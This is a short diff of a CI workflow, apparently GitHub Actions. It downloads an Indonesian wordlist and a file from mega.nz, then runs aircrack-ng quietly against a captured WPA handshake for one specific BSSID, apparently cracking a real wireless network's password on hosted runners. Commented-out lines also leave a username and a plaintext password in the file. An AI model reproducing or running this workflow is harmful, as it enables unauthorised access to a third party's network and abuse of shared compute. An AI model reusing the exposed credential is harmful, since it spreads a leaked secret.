@@ -29,9 +29,11 @@ jobs:
         sudo swapon /swapfile
         mkdir hs
         cd hs
+        #wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+        git clone https://github.com/geovedi/indonesian-wordlist.git ind
+        cd ind
         megadl https://mega.nz/file/uoMjmbSD#9kmnD7PHFVBTD--HUr8ZIyunMeuin_CGo_-X0j0zD2I
-        wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
-        sudo aircrack-ng -w rockyou.txt wr.cap
+        sudo aircrack-ng -q -w *.lst -b 58:D3:12:CC:E1:F5 wr.cap /dev/null 2>&1
         #FILE="clang22-131025.tar.zst"
         #USER="onettboots"
         #PASSWORD="Nazma4242@"
